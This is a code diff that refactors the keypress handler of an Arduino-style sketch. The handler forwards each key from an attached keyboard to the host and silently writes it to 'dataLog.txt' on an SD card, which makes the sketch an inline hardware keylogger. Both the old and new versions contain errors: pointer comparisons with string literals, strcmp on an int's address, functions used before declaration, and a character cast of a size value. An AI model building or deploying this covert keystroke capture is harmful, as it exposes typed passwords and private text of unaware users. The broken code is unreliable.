@@ -76,50 +76,50 @@ bool bthid_driver_active[CNT_HIDDEVICES] = {false};
 #endif
 
 void OnPress(int key) {
-  static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
-  static const char* specialKeys[] = {
-                                    "UP", "DN", "LEFT", "RIGHT", "Ins", "Del", "PUP",
-                                     "PDN", "HOME", "END", "F1", "F2", "F3", "F4", "F5",
-                                     "F6", "F7", "F8", "F9", "F10", "F11", "F12"
-                                };
+    static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
+    static const char* specialKeys[] = {
+        "UP", "DN", "LEFT", "RIGHT", "Ins", "Del", "PUP",
+        "PDN", "HOME", "END", "F1", "F2", "F3", "F4", "F5",
+        "F6", "F7", "F8", "F9", "F10", "F11", "F12"
+    };
 
-  int numSpecialKeys = sizeof(specialKeys)/sizeof(specialKeys[0]); // get the number of special keys
+    int numSpecialKeys = sizeof(specialKeys) / sizeof(specialKeys[0]);
 
-
-  if((char*)key == "\n" || (char*)key == "\r")
-    Serial.println("");
-    
-  // Check if the key is not in the special keys list
-  bool isSpecialKey = false;
-  for (int i = 0; i < numSpecialKeys; i++) {
-    if (strcmp(specialKeys[i], (char*)key) == 0) {
-      isSpecialKey = true;
-      break;
+    if (isCarriageReturnOrNewLine(key)) {
+        Serial.println("");
     }
-  }
-  
-  if (!isSpecialKey) {
-     Keyboard.print((char*)key);
-        dataLog.print((char*)key);
-
-      // For the ouput for debugging
-      Serial.print((char*)key);
-      Serial.println(dataLog.size());
-      uint64_t usedSize = SD.usedSize() / (1024 * 1024);
-      Serial.print("Taille utilisée : ");
-      Serial.print(usedSize);
-      Serial.print(" Mo./");
-      uint64_t cardSize = SD.totalSize() / (1024 * 1024);
-      Serial.print(cardSize);
-      Serial.println(" Mo.");
-  } 
-
-  
-
-
-
-  
+    else if (!isSpecialKey(key, specialKeys, numSpecialKeys)) {
+        Keyboard.print((char)key);
+        dataLog.print((char)key);
+        printDebugOutput(dataLog.size(), SD.usedSize(), SD.totalSize());
+    }
 }
+
+bool isCarriageReturnOrNewLine(int key) {
+    return key == '\n' || key == '\r';
+}
+
+bool isSpecialKey(int key, const char* specialKeys[], int numSpecialKeys) {
+    for (int i = 0; i < numSpecialKeys; i++) {
+        if (strcmp(specialKeys[i], (char*)&key) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
+
+void printDebugOutput(size_t dataSize, uint64_t usedSize, uint64_t totalSize) {
+    Serial.print((char)dataSize);
+    Serial.println(dataSize);
+    uint64_t usedSizeInMB = usedSize / (1024 * 1024);
+    uint64_t totalSizeInMB = totalSize / (1024 * 1024);
+    Serial.print("Taille utilisée : ");
+    Serial.print(usedSizeInMB);
+    Serial.print(" Mo./");
+    Serial.print(totalSizeInMB);
+    Serial.println(" Mo.");
+}
+
 
        
 
